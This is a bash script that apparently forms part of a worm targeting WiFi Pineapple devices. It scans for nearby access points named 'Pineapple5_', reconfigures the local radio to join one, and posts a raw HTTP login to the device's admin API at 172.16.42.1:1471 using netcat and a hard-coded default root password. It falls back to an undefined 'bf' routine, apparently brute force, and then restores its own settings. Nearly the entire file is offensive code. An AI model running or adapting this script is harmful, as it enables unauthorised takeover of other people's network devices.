#!/bin/bash
base=/tospo

self=`uci get wireless.@wifi-iface[0].ssid`

pushstate() {
	echo "Pushing state..."
	uci export wireless > $base/w
	uci export network > $base/n
}

popstate () {
	echo "Popping state..."
	ifconfig br-lan up
	ifconfig wlan0 up
	uci import -f $base/w
	uci import -f $base/n
	uci commit
	wifi
}

connect() {
	ssid=$1
	echo "Connecting to $ssid..."
	echo "Bringing radio up..."
	ifconfig wlan1 up
	echo "Avoiding conflicts..."
	ifconfig br-lan down
	ifconfig wlan0 down
	echo "Stripping keys..."	
	uci delete wireless.@wifi-iface[2].key
	uci delete wireless.@wifi-iface[2].encryption
	echo "Connect to the target..."
	uci set wireless.@wifi-iface[2].network=wan
	uci set wireless.@wifi-iface[2].mode=sta
	uci set wireless.@wifi-iface[2].ssid="$ssid"
	uci set wireless.@wifi-iface[2].hidden=0
	uci set wireless.radio1.channel=11
	echo "uci commit wireless"	
	uci commit wireless
	wifi
}

post() {
	len=`printf "$2" | wc -c`
	printf "POST $1 HTTP/1.1\nHost:172.16.42.1:1471\nContent-Type:application/x-www-form-urlencoded\nCookie:PHPSESSID=$3\nContent-Length:$len\nConnection: close\n\n$2" | nc 172.16.42.1 1471
}

login() {
	echo "Logging in..."
	creds="username=root&password=pineapplesareyummy&login="
	post '/includes/api/login.php' "$creds" "tospovirus" | grep -i 'invalid' && bf && post '/includes/api/login.php' "$creds" "tospovirus" | grep -i 'invalid' && echo "Login Failed..." && exit
	echo "Logged in Successfully!"
}

echo "Scanning for new devices..."
for net in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$self"`
do
	pushstate
	connect `echo $net | cut -d '"' -f 2`
	login
	popstate
	break
done
